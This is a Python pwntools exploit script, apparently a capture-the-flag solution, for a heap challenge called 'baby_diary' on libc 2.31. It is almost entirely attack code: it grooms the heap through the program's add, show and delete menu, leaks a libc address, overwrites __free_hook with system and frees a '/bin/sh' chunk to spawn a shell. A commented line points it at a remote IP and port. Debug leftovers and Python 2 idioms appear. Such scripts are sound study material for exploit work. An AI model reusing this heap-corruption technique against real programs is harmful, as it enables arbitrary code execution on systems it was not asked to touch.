#!/usr/bin/env python
# coding=utf-8
from pwn import *
sh=process('./baby_diary')
#sh=remote('8.140.114.72', 1399)
elf=ELF('./baby_diary')
libc=ELF('./libc-2.31.so')
context.arch="amd64"
#context.log_level="debug"

def add(size, content=b'/bin/sh\x00'):
    sh.recvuntil(b">> ")
    sh.sendline(b"1")
    sh.recvuntil(b"size: ")
    sh.sendline(str(size).encode())
    sh.recvuntil(b"content: ")
    sh.sendline(content)

def show(idx):
    sh.recvuntil(b">> ")
    sh.sendline(b"2")
    sh.recvuntil(b"index: ")
    sh.sendline(str(idx).encode())

def delete(idx):
    sh.recvuntil(b">> ")
    sh.sendline(b"3")
    sh.recvuntil(b"index: ")
    sh.sendline(str(idx).encode())

def stop():
    print(str(proc.pidof(sh)))
    pause()

def pwn():
    add(0x4c60)                   #0, can delete
    [add(0x20) for i in range(7)] #1->7
    add(0x2000)                   #8
    add(0x10)                     #9
    delete(8)
    add(0x3000)                   #8
    add(0x20, p64(0)+p64(0x801)+p8(0x48))                     #10
    add(0x20)
    for i in range(7):
        delete(1+i)
    delete(11)
    delete(10)
    [add(0x20) for i in range(7)]
    add(0x20, p8(0x60))
    add(0x1d0+0x801-0x251, p64(2)*10)
    add(0x17)
    delete(12)
    add(0x800)
    add(0x17, p64(0)*2+p32(0)+p8(0)*3)
    add(0x10)
    gdb.attach(sh)
    time.sleep(5)
    delete(13)
    add(0x17, p64(0)+p64(8))
    add(0xfb0)
    delete(12)
    add(0x40)
    show(11)
    sh.recvuntil("content: ")
    leak_addr=u64(sh.recv(6).ljust(8, '\x00'))
    print(hex(leak_addr))
    main_arena_offset=0x1ebb80
    libc_base=leak_addr-96-main_arena_offset
    libc.address=leak_addr-96-main_arena_offset
    print(hex(libc_base))
    add(0x10)
    add(0x10)
    delete(17)
    delete(16)
    delete(13)
    add(0x700)
    add(0x100, p64(0)*7+p64(0x21)+p64(libc.sym['__free_hook']-8))
    add(0x10)
    onegadget=[0xe6e73, 0xe6e76, 0xe6e79]
    add(0x17, p64(libc.search("/bin/sh").next())+p64(libc.sym['system']))
    delete(0)
    sh.interactive()

if __name__ == "__main__":
    while True:
        # sh=process("./baby_diary")
        # sh=remote('8.140.114.72', 1399)
        try:
            pwn()
        except:
            sh.close()

